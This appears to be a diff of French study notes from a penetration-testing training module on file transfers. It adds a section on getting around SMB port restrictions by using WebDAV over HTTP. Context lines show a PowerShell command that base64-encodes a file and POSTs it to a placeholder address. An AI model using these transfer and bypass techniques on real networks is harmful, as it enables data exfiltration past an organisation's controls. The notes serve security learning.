@@ -2,7 +2,7 @@
 title: File Transfers
 description: 
 published: true
-date: 2025-03-29T13:06:53.899Z
+date: 2025-03-29T13:13:07.392Z
 tags: notes, htb, module
 editor: markdown
 dateCreated: 2025-03-16T15:21:30.098Z
@@ -259,4 +259,10 @@ $b64 = [System.convert]::ToBase64String((Get-Content -Path '<fichier>' -Encoding
 Invoke-WebRequest -Uri http://<adresse>:<port>/ -Method POST -Body $b64
 ```
 
+### SMB Uploads
 
+Par précaution, le port 445 (SMB) est souvent restreint au réseau interne de l'organisation.
+Pour plus d'informations vous pouvez consulter le post Microsoft "[Preventing SMB traffic from lateral connections and entering or leaving the network](https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a)".
+
+Pour contourner cela, il est possible d'utiliser SMB over HTTP avec [WebDAV](https://datatracker.ietf.org/doc/html/rfc4918).
+WebDAV est une extension du protocole HTTP qui permet aux serveurs web de se comporter comme des serveurs de fichiers (supportant la création de contenu collaboratif). WebDAV peut aussi utiliser HTTPS.
